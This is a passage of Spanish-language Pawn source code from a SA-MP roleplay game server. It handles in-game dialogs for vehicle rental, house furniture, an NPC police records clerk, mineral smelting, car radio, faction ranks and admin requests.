			 		Hotring = CreateVehicle(502, -1391.7560,-236.7261,1043.047, 0, random(120), random(120), 120);
				}
				else
				{
			 		Hotring = CreateVehicle(502, -1397.2988,-237.6023,1043.0203, 0, random(120), random(120), 120);
				}
				Loop(i, 20, 0)
				{
				    if(VehPrueba[i] == INVALID_VEHICLE_ID)
				    {
						VehPrueba[i] = Hotring;
					 	FoundCar = true;
						break;
					}
				}
				if(!FoundCar)
				{
				    Error(playerid, "¡No quedan más vehículos de renta!");
					DestroyVehicle(Hotring);
				}
				if(GetPVarInt(playerid, "ESTADIO_VEHID")) DestroyVehicle(GetPVarInt(playerid, "ESTADIO_VEHID"));
				LinkVehicleToInterior(Hotring, 7);
				PutPlayerInVehicle(playerid, Hotring, 0);
				Mensaje(playerid,-1,"Rentaste un Hotring, en el estadio "#CVERDE"(TC-2000)");
				SetPVarInt(playerid,"ESTADIO_VEHID", GetPlayerVehicleID(playerid) );
			}
		}
		case dElegirCasaM:
		{
		    if(!response) return 1;
		    new
				CasaC,
				OBJ_ID = GetPVarInt(playerid, "MuebleID"),
				OBJ_INDEX;

			foreach(Casas, i)
			{
			    if(EsDuenoCasa(playerid, i) || TieneLlaveCasa(playerid,i) )
			    {
			        CasaC++;
			        if(CasaC == (listitem+1))
			        {
						Loop(m, MAX_MUEBLES_CASA, 0)
						{
						    if(!InfoCasa[i][cObjModel][m])
							{
							    BuscarModeIndexInt(OBJ_ID, OBJ_INDEX);
							    if(GetPlayerMoney(playerid) < ObjetosInterior[OBJ_INDEX][1]) return Error(playerid,"¡Dinero insuficiente!");
			               		InfoCasa[i][cObjModel][m] = ObjetosInterior[OBJ_INDEX][0];
			               		MensajeF(playerid, -1, "Agregaste un(a) "#CINFO"%s "#CBLANCO"a tu casa "#CVERDE"(%s) "#CBLANCO"por $%d", ObjetosInterior[OBJ_INDEX][2], InfoCasa[i][cNombre], ObjetosInterior[OBJ_INDEX][1]);
								QuitarDinero(playerid,ObjetosInterior[OBJ_INDEX][1]);
								ActualizarCasa(i, false, m, false);
								return 1;
							}
						}
					}
				}
			}
			return Error(playerid,"Hubo un error en la compra.");
		}

		#if !defined VERSION_03x

		case dCMueble:
		{
	  		if(response)
		    {
			    new Str[80 * MAX_CASAS_JUGADOR],Str2[80],bool:sucess;
			    foreach(Casas,c)
			    {
			        if(EsDuenoCasa(playerid,c))
			        {
			            sucess = true;
			            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"( ID: %d )\n",InfoCasa[c][cNombre],c);
						strcat(Str,Str2);
					}
				}
				if(!sucess) return Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Elige la casa para el mueble",""#CBLANCO"¡No tienes casas!","Cerrar","");
				Dialog(playerid,dElegirCasaM,DIALOG_STYLE_LIST,""#CINFO"Elige la casa para el mueble:",Str,"Aceptar","Cancelar");
				SetPVarInt(playerid,"MuebleID", ObjetosInterior[ listitem ][0]);
			}
		}

		#endif

		case dCCasa:
		{
			new i = GetPVarInt(playerid, "ID_CREARCASA");

			InfoCasa[i][cSalida_x] = InfoInteriorCasa[listitem+1][iPos_x];
			InfoCasa[i][cSalida_y] = InfoInteriorCasa[listitem+1][iPos_y];
			InfoCasa[i][cSalida_z] = InfoInteriorCasa[listitem+1][iPos_z];
			InfoCasa[i][cInt]      = InfoInteriorCasa[listitem+1][iInt];
			ActualizarCasa(i);
			DeletePVar(playerid,"ID_CREARCASA");

		}
		case dPrecioyNombreM:
		{
		    if( response )
		    {
				SetPVarInt(playerid,"CONFIRMA_COMPRAM", 1);
				OnPlayerModelSelection(playerid, 1, m_Muebles, GetPVarInt(playerid,"MuebleID"));
			}
		}
		case dElegirAcento:
		{
		    if( response )
		    {
				if(listitem < sizeof(Acentos))
				{
			        InfoJugador[playerid][jAcento] = listitem+1;
			        MensajeF(playerid, -1, "Tu acento fue cambiado a "#CVERDE"%s", Acentos[listitem]);
				}
				else
				{
			        InfoJugador[playerid][jAcento] = 0;
			        Mensaje(playerid, -1, "Tu acento fue "#CROJO"Borrado");
				}
		    }
		}
		case dInfoLSPD:
		{
		    if(!response)
		    {
				return 1;
			}
			switch(listitem)
			{
				case 0:
				{
					SetTimerEx("Claudia_LSPD", NPCTalk(NPC_SECRETARIA_LSPD, "Bien digame el DNI del individio que desee buscar."), false, "ii", playerid, 0);
				}
				case 1:
				{
					SetTimerEx("Claudia_LSPD", NPCTalk(NPC_SECRETARIA_LSPD, "Bien digame el DNI del individio."), false, "ii", playerid, 3);
				}
			}
			OnPlayerText(playerid, inputtext);
		}
		case dBuscarPersona:
		{
		    if(!IsNumeric(inputtext) || strlen(inputtext) != 6 )
		    {
		        NPCTalk(NPC_SECRETARIA_LSPD, "Ese DNI no existe!");
		        return 1;
			}
			new
			    DNI = strval(inputtext),
				TalkTime = NPCTalk(NPC_SECRETARIA_LSPD, "Aguarde un momento..       "),
				string[100], string2[60];

  			new str[7];
			valstr(str, DNI);
			OnPlayerText(playerid, str);

			foreach(Player, i)
			{
			    if(InfoJugador[i][jDNI] == DNI)
			    {

					strcat(string, "Encontrado.\n");
					A_Format(string2, "Nombre: %s, Edad: %d años.", NombreJugador_(i), InfoJugador[i][jEdad]);
					strcat(string, string2);
					strcat(string, "\nAhora le digo los antecedentes.");

					SetPVarString(playerid, "Claudia_Antecedentes", string);
					SetPVarInt(playerid, "Claudia_ID", i);
					SetTimerEx("Claudia_LSPD", TalkTime, false, "ii", playerid, 1);
					return 1;
			    }
			}
			NPCTalk(NPC_SECRETARIA_LSPD, "Lo siento, el sistema no encontro ese DNI.");
		}
		case dAgregarAnt:
		{
		    if(!response)
			{
			    DeletePVar(playerid, "DNI_AgregarAnt");
				DeletePVar(playerid, "Parte_AgregarAnt");
				return 1;
			}
		    if(!GetPVarInt(playerid, "Parte_AgregarAnt"))
			{
			    if(!IsNumeric(inputtext) || strlen(inputtext) != 6 )
			    {
			        NPCTalk(NPC_SECRETARIA_LSPD, "Ese DNI no existe!");
			        return 1;
				}
				foreach(Player, i)
				{
				    if(InfoJugador[i][jDNI] == strval(inputtext))
				    {
						SetPVarInt(playerid, "DNI_AgregarAnt", i);
						SetPVarInt(playerid, "Parte_AgregarAnt", true);
						Dialog(playerid, dAgregarAnt, DIALOG_STYLE_INPUT, ""#CVERDE"Claudia: "#CBLANCO"Una breve descripción del antecedente?", ""#CBLANCO"Escribe una breve descripción del delito.\n\nMínimo: "#CROJO"10 caracteres\n"#CBLANCO"Máximo: "#CROJO""#MAX_CARACTERES_ANTECEDENTE" caracteres", "Hablar", "Cancelar");
						return 1;
					}
				}
				return NPCTalk(NPC_SECRETARIA_LSPD, "Ese DNI no existe!");
			}
			else
			{
			    new
			        DNI = GetPVarInt(playerid, "DNI_AgregarAnt"),
					len = strlen(inputtext);

				if(!(6 <= len <= MAX_CARACTERES_ANTECEDENTE)) return Dialog(playerid, dAgregarAnt, DIALOG_STYLE_INPUT, ""#CVERDE"Claudia: "#CBLANCO"Una breve descripción del antecedente?", ""#CBLANCO"Escribe una breve descripción del delito.\n\nMínimo: "#CROJO"10 caracteres\n"#CBLANCO"Máximo: "#CROJO""#MAX_CARACTERES_ANTECEDENTE" caracteres", "Hablar", "Cancelar");
				if(!IsPlayerConnected(DNI))
				{
				    Error(playerid, "El jugador se desconectó. ~n~Si cometio una falta de rol, reportalo en "#FORO_SERVER"");
				    DeletePVar(playerid, "DNI_AgregarAnt");
					DeletePVar(playerid, "Parte_AgregarAnt");
					return 1;
				}
				OnPlayerText(playerid, inputtext);
				AgregarAntecedente(DNI, inputtext);
			 	NPCTalk(NPC_SECRETARIA_LSPD, "Muy bien, ya lo agregué al sistema.");
			    DeletePVar(playerid, "DNI_AgregarAnt");
				DeletePVar(playerid, "Parte_AgregarAnt");
			}
		}
		case dFundirMineral:
		{
		    if(!response)
		    {
				DeletePVar(playerid, "Tipo_Mineral");
				return 1;
			}
			if(!IsNumeric(inputtext)) return Error(playerid, "¡Escribe el número de gramos para fundir!");

			new
				val = strval(inputtext),
				index = GetPVarInt(playerid, "Tipo_Mineral");

			if(!val)
			{
				DeletePVar(playerid, "Tipo_Mineral");
				return Error(playerid, "Escribe un número válido.");
			}

			if(val > InfoJugador[playerid][jMineral][index])
			{
				DeletePVar(playerid, "Tipo_Mineral");
				return Error(playerid, "¡No tienes esa cantidad!");
			}

			if(GetPlayerMoney(playerid) < 150)
			{
				DeletePVar(playerid, "Tipo_Mineral");
				return Error(playerid, "¡Necesitas ~g~$150 ~w~para usar el horno!");
			}
			new
				CarbonNecesitado = floatround(floatmul(float(val), 0.4)),
				MineralFundido   = floatround(floatmul(float(val), 0.75));

			if(InfoJugador[playerid][jMineral][M_TYPE_CARBON] < CarbonNecesitado)
			{
			    new str[50];
			    A_Format(str, "Necesitas %dgr de carbón para fundir %dgr.", CarbonNecesitado, val);
			    return Error(playerid, str);
			}

			if(Timer_FundiendoMinerales != INVALID_TIMER_ID)
			    return Error(playerid, "¡El Horno está ocupado!");

			FundiendoMinerales = CreateDynamic3DTextLabel("Fundido: 0% (0 gr)", C_ROJO, 253.3179,-95.3065,1001.5178, 3.5);

			SetPVarInt(playerid, "FundiendoMetal", true);
			SetPVarInt(playerid, "GramosFundidos", 0);
			SetPVarInt(playerid, "TotalGramos", MineralFundido);

			Timer_FundiendoMinerales = SetTimerEx("FundiendoMetales", 3000, true, "ii", playerid, index);

			InfoJugador[playerid][jMineral][M_TYPE_CARBON] -= CarbonNecesitado;
			InfoJugador[playerid][jMineral][index] -= val;

			MensajeF(playerid, -1, "Fundiste %dgr de %s, utilizaste %dgr de Carbón y obtubiste %dgr de %s fundido.", val, GetMinName(index), CarbonNecesitado, MineralFundido, GetMinName(index) );
			QuitarDinero(playerid, 150);

			OBJ_FuegoHorno[0] = CreateDynamicObject(3461, 253.60, -97.07, 999.13,   0.00, 0.00, 0.00);
			OBJ_FuegoHorno[1] = CreateDynamicObject(3461, 253.00, -95.35, 999.13,   0.00, 0.00, 0.00);
			OBJ_FuegoHorno[2] = CreateDynamicObject(3461, 253.12, -97.66, 999.13,   0.00, 0.00, 0.00);
			OBJ_FuegoHorno[3] = CreateDynamicObject(3461, 252.96, -96.27, 999.13,   0.00, 0.00, 0.00);
			OBJ_FuegoHorno[4] = CreateDynamicObject(3461, 253.32, -93.96, 999.13,   0.00, 0.00, 0.00);
			OBJ_FuegoHorno[5] = CreateDynamicObject(3461, 253.66, -94.57, 999.13,   0.00, 0.00, 0.00);

			AutoRol(playerid, "enciende fuego con su encendedor para fundir minerales");
		}
		case dRadio:
		{
		    if(!IsPlayerInAnyVehicle(playerid) || !response)
		        return 1;

			new
			    VehID = GetPlayerVehicleID(playerid);

			switch(listitem)
			{
			    case RADIO_LSTV:
			    {
			    	StopAudioStreamForVehicle(VehID);
			        PlayAudioStreamForVehicle(VehID, RadioLSTV);
				}
				case RADIO_REGGAE:
			    {
			    	StopAudioStreamForVehicle(VehID);
			        PlayAudioStreamForVehicle(VehID, URL_REGGAE);
				}
				case RADIO_RAP:
			    {
			    	StopAudioStreamForVehicle(VehID);
			        PlayAudioStreamForVehicle(VehID, URL_RAP);
				}
				case RADIO_APAGAR:
				{
			    	StopAudioStreamForVehicle(VehID);
		  			PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
		  			Veh[VehID][vRadio] = RADIO_APAGAR;
		  			return 1;
				}
			}
			Veh[VehID][vRadio] = listitem;
			PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
		}
		case dSpecReport:
		{
		    if(!response)
		    {
		        DeletePVar(playerid, "REPORT_IDSPEC");
		        return 1;
			}
			new str[5];
			valstr(str, GetPVarInt(playerid, "REPORT_IDSPEC"));
			DeletePVar(playerid, "REPORT_IDSPEC");
			cmd_spec(playerid, str);
			return 1;
		}
		case dElegirFamFac:
		{
		    if(response)//Familia
		    {
		        MensajeF(playerid, -1, "Elegiste mantener tu "#CAMARILLO"Familia, "#CBLANCO"fuiste automáticamente expulsado de "#CINFO"%s", NombreFaccion(ID_Faccion(playerid)) );
				InfoJugador[playerid][jLiderFam] = 0;
				InfoJugador[playerid][jMiembroFam] = 0;
				InfoJugador[playerid][jRango] = 1;
		    }
		    else // Facción
		    {
		        MensajeF(playerid, -1, "Elegiste mantener tu "#CAMARILLO"Facción, "#CBLANCO"fuiste automáticamente expulsado de "#CINFO"%s", InfoFamilia[ID_Familia(playerid)][fNombre] );
				InfoJugador[playerid][jLiderFam] = 0;
				InfoJugador[playerid][jMiembroFam] = 0;
				InfoJugador[playerid][jRangoFam] = 1;
			}
			ActualizarCuenta(playerid);
			return 1;
		}
		case dJustificarOffD:
		{
		    new str[135];
		    A_Format(str, "salió de servicio por: \"%s\" ", inputtext);
		    LogAdmin(playerid, str);
		    Mensaje(playerid, -1, "Datos guardados. ");
		}
		case dSolicitarADM:
		{
			if(!response) return 1;
			
			static
			    OldRequest[MAX_PLAYERS];

			new
				timec = gettime();
			    
			if(timec < OldRequest[playerid])
			    return MensajeF(playerid, -1, "Debes esperar "#CVERDE"%dm %ds "#CBLANCO"para enviar otra solicitud.", (OldRequest[playerid]-timec) / 60, (OldRequest[playerid]-timec) % 60 );

			OldRequest[playerid] = timec+(60*3);
			
			switch(listitem)
			{
			    case 0:
				{
				    new
						str[100];

				    A_Format(str, "El jugador "#CINFO"%s "#CBLANCO"solicita un "#CAYUDANTE"Ayudante "#CVERDE"(/as %d)", NombreJugador_(playerid), playerid);

			        foreach(Player, i)
			            if(InfoJugador[i][jAdmin] == Ayudante || InfoJugador[i][jAdmin] == Dueno)
			                Mensaje(i, -1, str);

				}
			    case 1:
			        MensajeAdminF(-1, "El jugador "#CINFO"%s "#CBLANCO"solicita un "#CVERDE"Mod/Admin "#CVERDE"(/as %d)", Moderador, NombreJugador_(playerid), playerid);

			}
			SetPVarInt(playerid, "SolicitaADM", true);
		}
		case dFaccion:
		{
		    if(!response) return 1;
		        
			new
			    str2[MAX_RANGO_LEN+20],
			    str[(MAX_RANGOS_FAC*sizeof(str2))+25],
				fac = InfoJugador[playerid][jLider];
			    
			Loop(i, InfoFaccion[fac][fRangos], 1)
			{
			    A_Format(str2, "Rango %d "#CVERDE"(%s)\n", i, InfoRango[fac][i]);
			    strcat(str, str2);
			}
		    A_Format(str2, "- Cambiar cantidad "#CROJO"(%d)", InfoFaccion[fac][fRangos]);
		    strcat(str, str2);
		    Dialog(playerid, dFac_Rangos, DIALOG_STYLE_LIST, "Facción >> Editar Rangos", str, "Aceptar", "<<");
		}
		case dFac_Rangos:
		{
//		    if(!response)
//		        return cmd_faccion(playerid, "");
		        
			new
				fac = InfoJugador[playerid][jLider];

			if(listitem < InfoFaccion[fac][fRangos])
			{
				new
				    str[38];
				    
				A_Format(str, "Facción >> Editar Rangos >> Rango %d", listitem+1);
			    Dialog(playerid, dFac_Rango_2, DIALOG_STYLE_INPUT, str, ""#CBLANCO"Escribe el nombre del rango "#CVERDE"(3-"#MAX_RANGO_LEN" caracteres)", "Cambiar", "<<");
			}
			else
			{
			    SetPVarInt(playerid, "EDIT_COUNTRANKS", true);
			    Dialog(playerid, dFac_Rango_2, DIALOG_STYLE_INPUT, "Facción >> Editar Rangos >> Cantidad", ""#CBLANCO"Escribe la cantidad de rangos deseada "#CVERDE"(1-"#MAX_RANGOS_FAC")", "Cambiar", "<<");
			}
			return 1;
		}
		case dFac_Rango_2:
		{
		    if(GetPVarInt(playerid, "EDIT_COUNTRANKS"))
		    {
		        new
		            val = strval(inputtext),
					fac = InfoJugador[playerid][jLider];
		            
		        if(!IsNumeric(inputtext) || 1 > val > (MAX_RANGOS_FAC-1))
			    	return Dialog(playerid, dFac_Rango_2, DIALOG_STYLE_INPUT, "Facción >> Editar Rangos >> Cantidad", ""#CBLANCO"Escribe la cantidad de rangos deseada "#CVERDE"(1-"#MAX_RANGOS_FAC")", "Cambiar", "<<");

				DeletePVar(playerid, "EDIT_COUNTRANKS");
				InfoFaccion[fac][fRangos] = val;
				MensajeF(playerid, -1, "La cantidad de rangos fue cambiada a "#CVERDE"%d.", val);
			}
			else
			{
		        new
		            len = strlen(inputtext),
					fac = InfoJugador[playerid][jLider],
					index = listitem+1;

		        if(3 >= len >= MAX_RANGO_LEN)
				{
				    return Dialog(playerid, dFac_Rango_2, DIALOG_STYLE_INPUT, "Facción >> Editar Rangos >> Rango %d", ""#CBLANCO"Escribe el nombre del rango "#CVERDE"(3-"#MAX_RANGO_LEN" caracteres)", "Cambiar", "<<");
				}
				MensajeF(playerid, -1, "El rango nº "#CVERDE"%d "#CBLANCO"fue cambiado a "#CINFO"%s", index, inputtext);
				alm(InfoRango[fac][index], inputtext);
			}
			return 1;
		}
		case dChangePregunta:
		{
		    if(!response)
		        return MensajeF(playerid, -1, "Operación fue cancelada");
		        
			new
			    len = strlen(inputtext);
			    
			if(len < 3 || len > MAX_CARACTERES_PS)
			    return Error(playerid, "La pregunta es demaciado corta, o demaciado larga.");

			new
			    INI:Arch = INI_Open(U_Usuario(playerid));
			    
			INI_SetTag(Arch, "data");
			INI_WriteString(Arch, "PreguntaS", inputtext);
			INI_Close(Arch);
			
			alm(InfoJugador[playerid][jPreguntaS], inputtext);
			MensajeF(playerid, -1, "La pregunta de seguridad fue cambiada a: "#CINFO"%s", inputtext);
		}
		case dReglas:
		{
		    if(response)
		        Dialog(playerid, dReglas_2, DIALOG_STYLE_MSGBOX, Reglas[listitem][eTitulo], Reglas[listitem][eCuerpo], "Cerrar", "<<");
		}
		case dReglas_2:
		{
		    if(!response)
				cmd_reglas(playerid, "");
		}
	}
	return 0;
}

stock PlayAudioStreamForVehicle(vehicleid, url[])
{
	foreach(Player, i)
	{
	    if(IsPlayerInVehicle(i, vehicleid))
	    {
	        PlayAudioStreamForPlayer(i, url);
		}
	}
	return 1;
}

stock StopAudioStreamForVehicle(vehicleid)
{
	foreach(Player, i)
	{
	    if(IsPlayerInVehicle(i, vehicleid))
	    {
	        StopAudioStreamForPlayer(i);
		}
	}
	return 1;
}

stock MensajeRadio(color, Str[], radio)
{
	foreach(Player, i)
	{
	    if(IsPlayerInAnyVehicle(i))
	    {
	        if(Veh[GetPlayerVehicleID(i)][vRadio] == radio)
	        {
	            Mensaje(i, color, Str);
			}
		}
	}
	return 1;
}

CALLBACK: FundiendoMetales(playerid, metal)
{
	if(!GetPVarInt(playerid, "FundiendoMetal"))
	{
	    KillTimer(Timer_FundiendoMinerales);
	    Timer_FundiendoMinerales = INVALID_TIMER_ID;

	    DestroyDynamic3DTextLabel(FundiendoMinerales);
		FundiendoMinerales = Text3D:INVALID_3DTEXT_ID;

		Loop(i, 6, 0)
		    DestroyDynamicObject(OBJ_FuegoHorno[i]);

	    return 1;
	}
	new
		str[30],
		total = GetPVarInt(playerid, "TotalGramos"),
		porfundir = GetPVarInt(playerid, "GramosFundidos"),
		percent_real = porfundir * 100 / total;

	SetPVarInt(playerid, "GramosFundidos", ((porfundir+50) < total) ? (porfundir+50) : total);
	if(percent_real > 100)
	{
	    percent_real = 100;
	}

	A_Format(str, "Fundido: %d%% (%d/%d)", percent_real, porfundir, total);
	UpdateDynamic3DTextLabelText(FundiendoMinerales, C_ROJO, str);

	if(percent_real == 100)
	{
	    DeletePVar(playerid, "FundiendoMetal");
	    DeletePVar(playerid, "TotalGramos");
	    DeletePVar(playerid, "GramosFundidos");

	    DestroyDynamic3DTextLabel(FundiendoMinerales);
		FundiendoMinerales = Text3D:INVALID_3DTEXT_ID;

	    KillTimer(Timer_FundiendoMinerales);
	    Timer_FundiendoMinerales = INVALID_TIMER_ID;

		Loop(i, 6, 0)
		    DestroyDynamicObject(OBJ_FuegoHorno[i]);


		//MensajeF(playerid, -1, "El %s ya se terminó de fundir, ahora ve a "#CINFO"/recoger minerales "#CBLANCO"al horno.", GetMinName(index) );
		return 1;
	}

	return 1;
}

stock GetMinName(index)
{
	new name[20] = "Mineral";

	switch(index)
	{
	    case M_TYPE_ORO:
	        name = "Oro";

	    case M_TYPE_PLATA:
	        name = "Plata";

	    case M_TYPE_HIERRO:
	        name = "Hierro";

	    case M_TYPE_RUBI:
	        name = "Rubi";

	    case M_TYPE_ZAFIRO:
	        name = "Zafiro";

	    case M_TYPE_ESMERALDA:
	        name = "Esmeralda";

	    case M_TYPE_CARBON:
	        name = "Carbón";

	    case M_TYPE_DIAMANTE:
	        name = "Diamante";
	}

	return name;
}

CALLBACK: Claudia_LSPD(playerid, type)
{
	switch(type)
	{
	    case 0:
	    {
	        Dialog(playerid, dBuscarPersona, DIALOG_STYLE_INPUT, ""#CVERDE"Claudia: "#CBLANCO"Bien, digame el DNI del individuo que desee buscar", ""#CBLANCO"Escribe el "#CROJO"DNI "#CBLANCO"de la persona que desees obtener información:", "Hablar", "");
		}
		case 1:
		{
		    new
		        Date[100];

			GetPVarString(playerid, "Claudia_Antecedentes", Date, 100);
			DeletePVar(playerid, "Claudia_Antecedentes");
          	NPCTalk(NPC_SECRETARIA_LSPD, Date);
          	SetTimerEx("Claudia_LSPD", 4000, false, "ii", playerid, 2);
		}
		case 2:
		{
		    new
		        ID = GetPVarInt(playerid, "Claudia_ID"), bool: Found,
				Str[MAX_CARACTERES_ANTECEDENTE+20];

			DeletePVar(playerid, "Claudia_ID");

			Loop(i, MAX_ANTECEDENTES, 0)
			{
			    new
			        Date[MAX_CARACTERES_ANTECEDENTE], Fecha[15];

			    if(BuscarAntecedente(ID, Date, Fecha, i) == 2)
			    {
			    	ProxDetector(15.0, NPC_SECRETARIA_LSPD, "Claudia dice: El individuo no tiene antecedentes.", -1, Hablar,Hablar2,Hablar3,Hablar4);
			    	return 1;
				}

			    if(!isnull(Date) && !isnull(Fecha))
			    {
					if(!Found) Found = true;
			    	A_Format(Str, "Claudia dice: [%s] %s", Fecha, Date);
			    	ProxDetector(15.0, NPC_SECRETARIA_LSPD, Str, -1,Hablar,Hablar2,Hablar3,Hablar4);
				}
			}
			if(!Found) ProxDetector(15.0, NPC_SECRETARIA_LSPD, "Claudia dice: El individuo no tiene antecedentes.", -1, Hablar,Hablar2,Hablar3,Hablar4);
		}
		case 3:
		{
			Dialog(playerid, dAgregarAnt, DIALOG_STYLE_INPUT, ""#CVERDE"Claudia: "#CBLANCO"Bien, digame el DNI del individuo", ""#CBLANCO"Escribe el "#CROJO"DNI "#CBLANCO"de la persona a la que le agregarás antecedentes.", "Hablar", "");
		}
	}
	return 1;
}

CALLBACK: EncontrarVeh(playerid,i)
{
	MensajeF(playerid,-1,"Vehículo encontrado: MODELO: "#CAZUL2"%s. "#CBLANCO"Se marcó la ubicación en el mapa",NombreVehiculo(ID_Original(i)));
	new Float:Pos[3];
	GetVehiclePos(ID_Original(i),Pos[0],Pos[1],Pos[2]);
	CheckpointGPS(playerid,Pos[0],Pos[1],Pos[2],4);
	return 1;
}

stock ActualizarAttach(playerid,id)
{
	SetPlayerAttachedObject(playerid,id,AttachmentObjects[InfoJugador[playerid][jAccesorio][id]][attachmodel],InfoJugador[playerid][jAttachBone][id],InfoJugador[playerid][jAttachPosx][id],InfoJugador[playerid][jAttachPosy][id],InfoJugador[playerid][jAttachPosz][id],InfoJugador[playerid][jAttachAngx][id],InfoJugador[playerid][jAttachAngy][id],InfoJugador[playerid][jAttachAngz][id],InfoJugador[playerid][jAttachEscx][id],InfoJugador[playerid][jAttachEscy][id],InfoJugador[playerid][jAttachEscz][id]);
	return 1;
}

stock BuscarModeIndexInt(model, &dest)
{
	Loop(i, sizeof ObjetosInterior, 0)
	{
		if(model == ObjetosInterior[i][0]) dest = i;
	}
	return 0;
}

stock PrecioBalaArma(i)
{
	switch(i)
	{
	    case 22,23: return 8;//balas 9mm
	    case 24,25,26,27,33: return 12;//dk, escopetas (balas grandes)
	    case 28,29,32: return 7;//subfusiles
	    case 30,31: return 10;//colt, ak
	    case 34: return 40;//ap
	    default: return 100;
	}
	return 10;
}

public OnPlayerEditAttachedObject( playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ )
{
	if(response)
	{
		InfoJugador[playerid][jAttachPosx][index] = fOffsetX;
		InfoJugador[playerid][jAttachPosy][index] = fOffsetY;
		InfoJugador[playerid][jAttachPosz][index] = fOffsetZ;
		InfoJugador[playerid][jAttachAngx][index] = fRotX;
		InfoJugador[playerid][jAttachAngy][index] = fRotY;
		InfoJugador[playerid][jAttachAngz][index] = fRotZ;
		InfoJugador[playerid][jAttachEscx][index] = fScaleX;
		InfoJugador[playerid][jAttachEscy][index] = fScaleY;
		InfoJugador[playerid][jAttachEscz][index] = fScaleZ;
		ActualizarAccesorios(playerid,index);
	}
	return 1;
}

public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	if(playerobject)
	{
		if(GetPVarInt(playerid,"EditandoMuebles"))
		{
	 		new
			 	ID = GetPVarInt(playerid, "ID_MUEBLE"),
	 			i = ID_Casa(playerid);

			Iter_Remove(Player, playerid);
			
			foreach(Player, p)
			{
			    if(CasaActual[p] == i)
			    {
			        MovePlayerObject(p, OBJ_Mueble[playerid][ID], fX, fY, fZ, 10.0, fRotX, fRotY, fRotZ);
				}
			}
			
			Iter_Add(Player, playerid);

		    if(response == EDIT_RESPONSE_FINAL)
		    {
				if(objectid == OBJ_Mueble[playerid][ID])
				{
				    InfoCasa[i][cObjPosX][ID] = fX;
				    InfoCasa[i][cObjPosY][ID] = fY;
				    InfoCasa[i][cObjPosZ][ID] = fZ;
				    InfoCasa[i][cObjRotX][ID] = fRotX;
				    InfoCasa[i][cObjRotY][ID] = fRotY;
				    InfoCasa[i][cObjRotZ][ID] = fRotZ;
			    	AjustarMueble_P(i,ID,InfoCasa[i][cObjPosX][ID],InfoCasa[i][cObjPosY][ID],InfoCasa[i][cObjPosZ][ID]);
					AjustarMueble_R(i,ID,InfoCasa[i][cObjRotX][ID],InfoCasa[i][cObjRotY][ID],InfoCasa[i][cObjRotZ][ID]);
				    ActualizarCasa(i, false, ID, false);
					SelectObject(playerid);
				}
			}
			else if(response == EDIT_RESPONSE_CANCEL)
			{
				if(objectid == OBJ_Mueble[playerid][ID])
				{
			    	AjustarMueble_P(i,ID,InfoCasa[i][cObjPosX][ID],InfoCasa[i][cObjPosY][ID],InfoCasa[i][cObjPosZ][ID]);
					AjustarMueble_R(i,ID,InfoCasa[i][cObjRotX][ID],InfoCasa[i][cObjRotY][ID],InfoCasa[i][cObjRotZ][ID]);
				}
			}
		}
	}
	return 1;
}

stock AjustarMueble_P(h, index, Float:x, Float:y, Float:z, playerid = INVALID_PLAYER_ID)
{
	new
		bool: playerused = (0 <= playerid < MAX_PLAYERS);
		
	if(playerused)
	    Iter_Remove(Player, playerid);

	foreach(Player, i)
	{
	    if(CasaActual[i] == h)
	    {
		    SetPlayerObjectPos(i, OBJ_Mueble[i][index], x, y, z);
		}
	}

	if(playerused)
	    Iter_Add(Player, playerid);

	return 1;
}

stock AjustarMueble_R(h, index, Float:x, Float:y, Float:z, playerid = INVALID_PLAYER_ID)
{
	new
		bool: playerused = (0 <= playerid < MAX_PLAYERS);

	if(playerused)
	    Iter_Remove(Player, playerid);

	foreach(Player, i)
	{
	    if(CasaActual[i] == h)
	    {
		    SetPlayerObjectRot(i, OBJ_Mueble[i][index], x, y, z);
		}
	}

	if(playerused)
	    Iter_Add(Player, playerid);

	return 1;
}

stock DestruirMuebleCasa(h, index)
{
	foreach(Player, i)
	{
	    if(CasaActual[i] == h)
	    {
		    DestroyPlayerObject(i, OBJ_Mueble[i][index]);
		}
	}
	return 1;
}

public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
/*	if(GetPVarInt(playerid, "EditandoKP"))
	{
	    if(response == EDIT_RESPONSE_FINAL)
		{
			MensajeF(playerid, -1, "%.04f, %.04f, %.04f, %.04f", x, y, z, rz);
			DeletePVar(playerid, "EditandoKP");
			return 1;
		}
	}*/
	if(GetPVarInt(playerid,"EDITAR_IDObj") != 0)
	{
 		new IDO = GetPVarInt(playerid,"EDITAR_IDObj");
   		if(objectid == Objeto[IDO][oID])
	    {
			Objeto[IDO][oPosx] = x;
			Objeto[IDO][oPosy] = y;
			Objeto[IDO][oPosz] = z;
			Objeto[IDO][oAngx] = rx;
			Objeto[IDO][oAngy] = ry;
			Objeto[IDO][oAngz] = rz;
		}
	}
 	if(response == EDIT_RESPONSE_FINAL)
  	{
		new i = GetPVarInt(playerid, "PORTON_EDITAR");

  	    if(objectid == InfoPorton_Ex[i][portID])
  	    {
			switch(GetPVarInt(playerid,PVar_PORTON))
			{
			    case EDIT_POS:
			    {
					InfoPorton_Ex[i][pX] = x;
					InfoPorton_Ex[i][pY] = y;
					InfoPorton_Ex[i][pZ] = z;
					InfoPorton_Ex[i][pRX] = rx;
					InfoPorton_Ex[i][pRY] = ry;
					InfoPorton_Ex[i][pRZ] = rz;
				}
			    case EDIT_ABIERTO:
			    {
					InfoPorton_Ex[i][pAX] = x;
					InfoPorton_Ex[i][pAY] = y;
					InfoPorton_Ex[i][pAZ] = z;
	    		}
			}
			Mensaje(playerid, -1, "La posición del portón fue "#CVERDE"actualizada.");
			return 1;
		}
	}
	if(GetPVarInt(playerid, "AcomodandoMinerales"))
	{
	    if(response == EDIT_RESPONSE_FINAL)
	    {
			DeletePVar(playerid, "AcomodandoMinerales");
			new
			    File: Minerales = fopen("minerales.txt", io_append),
			    str[200];

			A_Format(str, "{%f, %f, %f, %f, %f, %f},\r\n", x, y, z, rx, ry, rz);
			fwrite(Minerales, str);
			fclose(Minerales);
			MensajeF(playerid, -1, "Exportado a "#CINFO"'minerales.txt'.");
